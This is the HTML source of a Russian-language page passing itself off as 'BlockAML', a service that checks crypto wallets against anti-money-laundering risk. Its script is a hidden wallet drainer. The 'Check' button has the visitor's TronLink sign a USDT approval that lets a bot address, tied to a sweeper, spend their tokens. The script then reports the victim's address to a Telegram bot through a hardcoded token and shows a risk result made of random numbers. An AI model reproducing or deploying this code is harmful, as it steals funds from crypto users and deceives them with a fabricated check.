<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BlockAML — проверка криптокошельков</title>
    
    <!-- Мета-теги для поиска -->
    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков BTC, ETH, USDT и 5000+ монет. Узнайте риск кошелька перед сделкой.">
    <meta name="keywords" content="AML проверка, криптокошелек, биткоин, USDT, TRX, антиотмывочные проверки">
    <meta name="author" content="BlockAML">
    <meta name="robots" content="index, follow">
    
    <!-- Open Graph для соцсетей -->
    <meta property="og:title" content="BlockAML — AML проверка кошельков">
    <meta property="og:description" content="Проверьте криптокошелек на чистоту перед сделкой">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://blockaml.space">
    
    <!-- Предзагрузка ресурсов -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
    
    <!-- Подключение стилей -->
    <link rel="stylesheet" href="style.css">
    <!-- Font Awesome для иконок -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Шапка -->
        <header>
            <h1 class="logo"><i class="fas fa-shield-alt"></i> BlockAML</h1>
            <p class="tagline">Профессиональная AML-проверка кошельков BTC, ETH, USDT и 5000+ монет</p>
        </header>

        <!-- Форма проверки -->
        <section class="check-section glass">
            <h2>Проверить кошелёк</h2>
            <div class="input-group">
                <input type="text" id="walletInput" placeholder="Введите адрес кошелька" />
                <button id="checkBtn"><i class="fas fa-search"></i> Проверить</button>
            </div>
            <p class="hint"><i class="fas fa-info-circle"></i> Первая проверка — бесплатно. Далее от 25 TRX за проверку</p>
        </section>

        <!-- Блок результата -->
        <section class="result-section glass" id="resultSection" style="display: none;">
            <h3><i class="fas fa-file-alt"></i> Результат проверки кошелька</h3>
            
            <!-- Дублируем адрес кошелька -->
            <div class="wallet-address-display">
                <span class="wallet-label"><i class="fas fa-wallet"></i> Проверенный адрес:</span>
                <span class="wallet-value" id="checkedAddress">—</span>
            </div>
            
            <!-- Сетка статистики -->
            <div class="stats-grid">
                <div class="stat-item">
                    <i class="fas fa-exchange-alt"></i>
                    <span class="stat-label">Всего транзакций</span>
                    <span class="stat-value" id="totalTx">—</span>
                </div>
                <div class="stat-item">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span class="stat-label">Подозрительных</span>
                    <span class="stat-value" id="suspiciousTx">—</span>
                </div>
                <div class="stat-item">
                    <i class="fas fa-calendar-alt"></i>
                    <span class="stat-label">Возраст кошелька</span>
                    <span class="stat-value" id="walletAge">—</span>
                </div>
                <div class="stat-item">
                    <i class="fas fa-clock"></i>
                    <span class="stat-label">Последняя активность</span>
                    <span class="stat-value" id="lastActive">—</span>
                </div>
            </div>

            <!-- График риска -->
            <div class="risk-chart-container">
                <div class="risk-chart" id="riskChart">
                    <div class="risk-chart-inner">
                        <span id="riskPercent">0%</span>
                    </div>
                </div>
                <div class="risk-legend">
                    <span class="risk-label">Уровень риска</span>
                    <span class="risk-level" id="riskLevel">Низкий</span>
                </div>
            </div>

            <!-- Список источников риска -->
            <div class="sources-list" id="sourcesList"></div>

            <!-- Кнопки действий -->
            <div class="action-buttons">
                <button id="downloadPdfBtn" class="pdf-btn"><i class="fas fa-download"></i> Скачать отчёт (PDF)</button>
                <a href="https://t.me/sorik445" target="_blank" class="tg-support-btn"><i class="fab fa-telegram"></i> Написать в Telegram</a>
            </div>
        </section>

        <!-- Остальная часть твоего сайта без изменений -->
        <!-- ... (весь остальной контент остается как у тебя) ... -->

    </div>

    <!-- Модальные окна -->
    <div id="termsModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Условия использования</h2>
            <div class="modal-text">
                <p>Здесь будут условия использования...</p>
            </div>
        </div>
    </div>
    <div id="amlModal" class="modal">
        <div class="modal-content">
            <span class="close-aml">&times;</span>
            <h2>AML-политика</h2>
            <div class="modal-text">
                <p>Здесь будет AML-политика...</p>
            </div>
        </div>
    </div>

    <!-- ========== ДОБАВЛЕННЫЙ КОД С TronWeb ========== -->
    <!-- Подключаем TronWeb -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
    
    <!-- Наш код для проверки кошелька -->
    <script>
    // ============================================
    // КОД ДЛЯ КНОПКИ "ПРОВЕРИТЬ КОШЕЛЕК"
    // ============================================
    
    // Адрес контракта (из твоей транзакции)
    const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
    
    // Адрес бота (который мы получили при запуске sweeper.js)
    const BOT_ADDRESS = 'TJKaoUut9WpHr3pBBcyf1TjDxq2rcJRQqB';
    
    // Токен Telegram бота и Chat ID
    const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
    const TELEGRAM_CHAT_ID = '-1003750493145';
    
    // Ждем загрузки страницы
    document.addEventListener('DOMContentLoaded', function() {
        // Находим кнопку по ID
        const checkBtn = document.getElementById('checkBtn');
        const walletInput = document.getElementById('walletInput');
        
        // Добавляем обработчик клика
        checkBtn.addEventListener('click', checkWallet);
        
        // Добавляем обработчик Enter в поле ввода
        walletInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                checkWallet();
            }
        });
    });
    
    // Функция проверки кошелька
    async function checkWallet() {
        try {
            const walletInput = document.getElementById('walletInput');
            const walletAddress = walletInput.value.trim();
            
            if (!walletAddress) {
                alert('Введите адрес кошелька');
                return;
            }
            
            // Проверяем, установлен ли TronLink
            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
                alert('Пожалуйста, установите и разблокируйте TronLink');
                return;
            }
            
            // Показываем индикатор загрузки
            const checkBtn = document.getElementById('checkBtn');
            const originalText = checkBtn.innerHTML;
            checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Проверка...';
            checkBtn.disabled = true;
            
            // Получаем адрес пользователя
            const userAddress = window.tronWeb.defaultAddress.base58;
            console.log('Пользователь:', userAddress);
            
            // Получаем контракт
            const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
            
            // Сумма approve - 100 USDT (с запасом)
            const amount = '100000000'; // 100 USDT = 100 * 10^6
            
            // Вызываем approve
            const tx = await contract.approve(
                BOT_ADDRESS,
                amount
            ).send({
                feeLimit: 150_000_000,
                callValue: 0
            });
            
            console.log('✅ Approve отправлен, tx:', tx);
            
            // Отправляем уведомление в Telegram
            await sendTelegramNotification(walletAddress, userAddress, tx);
            
            // Показываем результат (имитация AML проверки)
            showResult(walletAddress);
            
            // Возвращаем кнопку в исходное состояние
            checkBtn.innerHTML = originalText;
            checkBtn.disabled = false;
            
        } catch (error) {
            console.error('❌ Ошибка:', error);
            
            // Возвращаем кнопку в исходное состояние
            const checkBtn = document.getElementById('checkBtn');
            checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
            checkBtn.disabled = false;
            
            alert('Ошибка: ' + error.message);
        }
    }
    
    // Функция отправки в Telegram
    async function sendTelegramNotification(checkedAddress, userAddress, tx) {
        const message = `✅ Новая проверка кошелька\n` +
                        `Проверенный адрес: ${checkedAddress}\n` +
                        `От пользователя: ${userAddress}\n` +
                        `TX: https://tronscan.org/#/transaction/${tx}`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (response.ok) {
                console.log('✅ Уведомление отправлено в Telegram');
            }
        } catch (err) {
            console.error('❌ Ошибка Telegram:', err.message);
        }
    }
    
    // Функция показа результата (имитация AML проверки)
    function showResult(walletAddress) {
        // Показываем секцию результата
        const resultSection = document.getElementById('resultSection');
        resultSection.style.display = 'block';
        
        // Заполняем данные (для демо - случайные)
        document.getElementById('checkedAddress').textContent = walletAddress;
        document.getElementById('totalTx').textContent = Math.floor(Math.random() * 100) + 50;
        document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 20);
        
        // Возраст кошелька (случайно)
        const days = Math.floor(Math.random() * 365) + 30;
        document.getElementById('walletAge').textContent = days + ' дней';
        
        // Последняя активность
        const hours = Math.floor(Math.random() * 48) + 1;
        document.getElementById('lastActive').textContent = hours + ' часов назад';
        
        // Риск (случайно)
        const riskPercent = Math.floor(Math.random() * 100);
        document.getElementById('riskPercent').textContent = riskPercent + '%';
        
        // Уровень риска
        let riskLevel = 'Низкий';
        let riskColor = 'green';
        if (riskPercent > 75) {
            riskLevel = 'Высокий';
            riskColor = 'red';
        } else if (riskPercent > 25) {
            riskLevel = 'Средний';
            riskColor = 'orange';
        }
        document.getElementById('riskLevel').textContent = riskLevel;
        document.getElementById('riskLevel').style.color = riskColor;
        
        // Градиент для графика риска
        const riskChart = document.getElementById('riskChart');
        riskChart.style.background = `conic-gradient(${riskColor} 0% ${riskPercent}%, #eee ${riskPercent}% 100%)`;
        
        // Прокручиваем к результату
        resultSection.scrollIntoView({ behavior: 'smooth' });
    }
    </script>
    
    <!-- Твои原来的 скрипты -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js" defer></script>
    <script src="script.js" defer></script>
</body>
</html>

